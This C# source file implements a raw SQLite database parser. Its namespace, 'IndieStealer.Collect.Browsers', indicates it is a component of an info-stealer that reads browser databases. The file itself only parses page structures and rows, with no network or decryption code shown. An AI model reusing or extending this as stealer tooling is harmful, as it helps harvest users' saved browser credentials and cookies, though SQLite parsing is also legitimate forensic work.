using System;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace IndieStealer.Collect.Browsers
{
    public class Sqlite3 : IDisposable
    {
        private byte[] _dbBytes;
        private ulong _encoding;
        private string[] _fieldNames;
        private SqliteMasterEntry[] _masterTableEntries;
        private ushort _pageSize;
        private byte[] _sqlDataTypeSize = new byte[] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
        private TableEntry[] _tableEntries;


        public Sqlite3(byte[] array)
        {
            this._dbBytes = array;
            this._pageSize = (ushort)this.ConvertToInteger(0x10, 2);
            this._encoding = this.ConvertToInteger(0x38, 4);
            if (decimal.Compare(new decimal(this._encoding), decimal.Zero) == 0)
            {
                this._encoding = 1L;
            }
            this.ReadMasterTable(100L);
        }
        private ulong ConvertToInteger(int startIndex, int size)
        {
            if ((size > 8) | (size == 0))
            {
                return 0L;
            }
            ulong num2 = 0L;
            int num4 = size - 1;
            for (int i = 0; i <= num4; i++)
            {
                num2 = (num2 << 8) | this._dbBytes[startIndex + i];
            }
            return num2;
        }

        private long Cvl(int startIndex, int endIndex)
        {
            endIndex++;
            byte[] buffer = new byte[8];
            int num4 = endIndex - startIndex;
            bool flag = false;
            if ((num4 == 0) | (num4 > 9))
            {
                return 0L;
            }
            if (num4 == 1)
            {
                buffer[0] = (byte)(this._dbBytes[startIndex] & 0x7f);
                return BitConverter.ToInt64(buffer, 0);
            }
            if (num4 == 9)
            {
                flag = true;
            }
            int num2 = 1;
            int num3 = 7;
            int index = 0;
            if (flag)
            {
                buffer[0] = this._dbBytes[endIndex - 1];
                endIndex--;
                index = 1;
            }
            int num7 = startIndex;
            for (int i = endIndex - 1; i >= num7; i += -1)
            {
                if ((i - 1) >= startIndex)
                {
                    buffer[index] = (byte)((((byte)(this._dbBytes[i] >> ((num2 - 1) & 7))) & (((int)0xff) >> num2)) | ((byte)(this._dbBytes[i - 1] << (num3 & 7))));
                    num2++;
                    index++;
                    num3--;
                }
                else if (!flag)
                {
                    buffer[index] = (byte)(((byte)(this._dbBytes[i] >> ((num2 - 1) & 7))) & (((int)0xff) >> num2));
                }
            }
            return BitConverter.ToInt64(buffer, 0);
        }

        public int GetRowCount()
        {
            return this._tableEntries.Length;
        }


        

        private int Gvl(int startIndex)
        {
            if (startIndex > this._dbBytes.Length)
            {
                return 0;
            }
            int num3 = startIndex + 8;
            for (int i = startIndex; i <= num3; i++)
            {
                if (i > (this._dbBytes.Length - 1))
                {
                    return 0;
                }
                if ((this._dbBytes[i] & 0x80) != 0x80)
                {
                    return i;
                }
            }
            return (startIndex + 8);
        }

        private bool IsOdd(long value)
        {
            return ((value & 1L) == 1L);
        }

        private void ReadMasterTable(ulong offset)
        {
            if (this._dbBytes[(int)offset] == 13)
            {
                ushort num2 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (this._masterTableEntries != null)
                {
                    length = this._masterTableEntries.Length;
                    this._masterTableEntries = (SqliteMasterEntry[])Utils.CopyArray((Array)this._masterTableEntries, new SqliteMasterEntry[(this._masterTableEntries.Length + num2) + 1]);
                }
                else
                {
                    this._masterTableEntries = new SqliteMasterEntry[num2 + 1];
                }
                int num13 = num2;
                for (int i = 0; i <= num13; i++)
                {
                    ulong num = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(offset), 100M) != 0)
                    {
                        num += offset;
                    }
                    int endIndex = this.Gvl((int)num);
                    long num7 = this.Cvl((int)num, endIndex);
                    int num6 = this.Gvl(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    this._masterTableEntries[length + i].row_id = this.Cvl(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num6);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num6), new decimal(num))), decimal.One));
                    endIndex = this.Gvl((int)num);
                    num6 = endIndex;
                    long num5 = this.Cvl((int)num, endIndex);
                    long[] numArray = new long[5];
                    int index = 0;
                    do
                    {
                        endIndex = num6 + 1;
                        num6 = this.Gvl(endIndex);
                        numArray[index] = this.Cvl(endIndex, num6);
                        if (numArray[index] > 9L)
                        {
                            if (this.IsOdd(numArray[index]))
                            {
                                numArray[index] = (long)Math.Round((double)(((double)(numArray[index] - 13L)) / 2.0));
                            }
                            else
                            {
                                numArray[index] = (long)Math.Round((double)(((double)(numArray[index] - 12L)) / 2.0));
                            }
                        }
                        else
                        {
                            numArray[index] = this._sqlDataTypeSize[(int)numArray[index]];
                        }
                        index++;
                    }
                    while (index <= 4);
                    if (decimal.Compare(new decimal(this._encoding), decimal.One) == 0)
                    {
                        this._masterTableEntries[length + i].item_type = Encoding.Default.GetString(this._dbBytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(this._encoding), 2M) == 0)
                    {
                        this._masterTableEntries[length + i].item_type = Encoding.Unicode.GetString(this._dbBytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(this._encoding), 3M) == 0)
                    {
                        this._masterTableEntries[length + i].item_type = Encoding.BigEndianUnicode.GetString(this._dbBytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    if (decimal.Compare(new decimal(this._encoding), decimal.One) == 0)
                    {
                        this._masterTableEntries[length + i].item_name = Encoding.Default.GetString(this._dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(this._encoding), 2M) == 0)
                    {
                        this._masterTableEntries[length + i].item_name = Encoding.Unicode.GetString(this._dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(this._encoding), 3M) == 0)
                    {
                        this._masterTableEntries[length + i].item_name = Encoding.BigEndianUnicode.GetString(this._dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    this._masterTableEntries[length + i].root_num = (long)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2]))), (int)numArray[3]);
                    if (decimal.Compare(new decimal(this._encoding), decimal.One) == 0)
                    {
                        this._masterTableEntries[length + i].sql_statement = Encoding.Default.GetString(this._dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(this._encoding), 2M) == 0)
                    {
                        this._masterTableEntries[length + i].sql_statement = Encoding.Unicode.GetString(this._dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(this._encoding), 3M) == 0)
                    {
                        this._masterTableEntries[length + i].sql_statement = Encoding.BigEndianUnicode.GetString(this._dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])), new decimal(numArray[3]))), (int)numArray[4]);
                    }
                }
            }
            else if (this._dbBytes[(int)offset] == 5)
            {
                ushort num11 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 3M)), 2)), decimal.One));
                int num14 = num11;
                for (int j = 0; j <= num14; j++)
                {
                    ushort startIndex = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(offset), 12M), new decimal(j * 2))), 2);
                    if (decimal.Compare(new decimal(offset), 100M) == 0)
                    {
                        this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(startIndex, 4)), decimal.One), new decimal(this._pageSize))));
                    }
                    else
                    {
                        this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(offset + startIndex), 4)), decimal.One), new decimal(this._pageSize))));
                    }
                }
                this.ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 8M)), 4)), decimal.One), new decimal(this._pageSize))));
            }
        }

        public bool ReadTable(string tableName)
        {
            try
            {
                int index = -1;
                int length = this._masterTableEntries.Length - 1;
                for (int i = 0; i <= length; i++)
                {
                    if (this._masterTableEntries[i].item_name.ToLower().CompareTo(tableName.ToLower()) == 0)
                    {
                        index = i;
                        break;
                    }
                }
                if (index == -1)
                {
                    return false;
                }
                string[] strArray = this._masterTableEntries[index].sql_statement.Substring(this._masterTableEntries[index].sql_statement.IndexOf("(") + 1).Split(new char[] { ',' });
                int num6 = strArray.Length - 1;
                for (int j = 0; j <= num6; j++)
                {
                    strArray[j] = (strArray[j]).TrimStart();
                    int num4 = strArray[j].IndexOf(" ");
                    if (num4 > 0)
                    {
                        strArray[j] = strArray[j].Substring(0, num4);
                    }
                    if (strArray[j].IndexOf("UNIQUE") == 0)
                    {
                        break;
                    }
                    this._fieldNames = (string[])Utils.CopyArray((Array)this._fieldNames, new string[j + 1]);
                    this._fieldNames[j] = strArray[j];
                }
                return this.ReadTableFromOffset((ulong)((this._masterTableEntries[index].root_num - 1L) * this._pageSize));
            }
            catch
            {
                return false;
            }
        }

        private bool ReadTableFromOffset(ulong offset)
        {
            if (this._dbBytes[(int)offset] == 13)
            {
                int num2 = Convert.ToInt32(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (this._tableEntries != null)
                {
                    length = this._tableEntries.Length;
                    this._tableEntries = (TableEntry[])Utils.CopyArray((Array)this._tableEntries, new TableEntry[(this._tableEntries.Length + num2) + 1]);
                }
                else
                {
                    this._tableEntries = new TableEntry[num2 + 1];
                }
                int num16 = num2;
                for (int i = 0; i <= num16; i++)
                {
                    RecordHeaderField[] fieldArray = null;
                    ulong num = this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(offset), 100M) != 0)
                    {
                        num += offset;
                    }
                    int endIndex = this.Gvl((int)num);
                    long num9 = this.Cvl((int)num, endIndex);
                    int num8 = this.Gvl(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    this._tableEntries[length + i].row_id = this.Cvl(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num8);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num8), new decimal(num))), decimal.One));
                    endIndex = this.Gvl((int)num);
                    num8 = endIndex;
                    long num7 = this.Cvl((int)num, endIndex);
                    long num10 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num), new decimal(endIndex)), decimal.One));
                    for (int j = 0; num10 < num7; j++)
                    {
                        fieldArray = (RecordHeaderField[])Utils.CopyArray((Array)fieldArray, new RecordHeaderField[j + 1]);
                        endIndex = num8 + 1;
                        num8 = this.Gvl(endIndex);
                        fieldArray[j].type = this.Cvl(endIndex, num8);
                        if (fieldArray[j].type > 9L)
                        {
                            if (this.IsOdd(fieldArray[j].type))
                            {
                                fieldArray[j].size = (long)Math.Round((double)(((double)(fieldArray[j].type - 13L)) / 2.0));
                            }
                            else
                            {
                                fieldArray[j].size = (long)Math.Round((double)(((double)(fieldArray[j].type - 12L)) / 2.0));
                            }
                        }
                        else
                        {
                            fieldArray[j].size = this._sqlDataTypeSize[(int)fieldArray[j].type];
                        }
                        num10 = (num10 + (num8 - endIndex)) + 1L;
                    }
                    this._tableEntries[length + i].content = new string[(fieldArray.Length - 1) + 1];
                    int num4 = 0;
                    int num17 = fieldArray.Length - 1;
                    for (int k = 0; k <= num17; k++)
                    {
                        if (fieldArray[k].type > 9L)
                        {
                            if (!this.IsOdd(fieldArray[k].type))
                            {
                                if (decimal.Compare(new decimal(this._encoding), decimal.One) == 0)
                                {
                                    this._tableEntries[length + i].content[k] = Encoding.Default.GetString(this._dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)fieldArray[k].size);
                                }
                                else if (decimal.Compare(new decimal(this._encoding), 2M) == 0)
                                {
                                    this._tableEntries[length + i].content[k] = Encoding.Unicode.GetString(this._dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)fieldArray[k].size);
                                }
                                else if (decimal.Compare(new decimal(this._encoding), 3M) == 0)
                                {
                                    this._tableEntries[length + i].content[k] = Encoding.BigEndianUnicode.GetString(this._dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)fieldArray[k].size);
                                }
                            }
                            else
                            {
                                this._tableEntries[length + i].content[k] = Encoding.Default.GetString(this._dbBytes, Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)fieldArray[k].size);
                            }
                        }
                        else
                        {
                            this._tableEntries[length + i].content[k] = Conversions.ToString(this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num7)), new decimal(num4))), (int)fieldArray[k].size));
                        }
                        num4 += (int)fieldArray[k].size;
                    }
                }
            }
            else if (this._dbBytes[(int)offset] == 5)
            {
                ushort num14 = Convert.ToUInt16(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 3M)), 2)), decimal.One));
                int num18 = num14;
                for (int m = 0; m <= num18; m++)
                {
                    ushort num13 = (ushort)this.ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(offset), 12M), new decimal(m * 2))), 2);
                    this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger((int)(offset + num13), 4)), decimal.One), new decimal(this._pageSize))));
                }
                this.ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(this.ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(offset), 8M)), 4)), decimal.One), new decimal(this._pageSize))));
            }
            return true;
        }
        public string GetValue(int rowIndex, string fieldName)
        {
            string result;
            try
            {
                int num = -1;
                int num2 = this._fieldNames.Length - 1;
                for (int i = 0; i <= num2; i++)
                {
                    if (String.Compare(this._fieldNames[i].ToLower().Trim(), fieldName.ToLower().Trim(), StringComparison.Ordinal) == 0)
                    {
                        num = i;
                        break;
                    }
                }
                if (num == -1)
                {
                    result = null;
                }
                else
                {
                    result = this.GetValue(rowIndex, num);
                }
            }
            catch
            {
                result = null;
            }
            return result;
        }
        public string GetValue(int rowNum, int field)
        {
            if (rowNum >= this._tableEntries.Length)
            {
                return null;
            }
            if (field >= this._tableEntries[rowNum].content.Length)
            {
                return null;
            }
            return this._tableEntries[rowNum].content[field];
        }
        [StructLayout(LayoutKind.Sequential)]
        private struct RecordHeaderField
        {
            public long size;
            public long type;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SqliteMasterEntry
        {
            public long row_id;
            public string item_type;
            public string item_name;
            public string astable_name;
            public long root_num;
            public string sql_statement;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct TableEntry
        {
            public long row_id;
            public string[] content;
        }

        public void Dispose()
        {
        }
    }

}
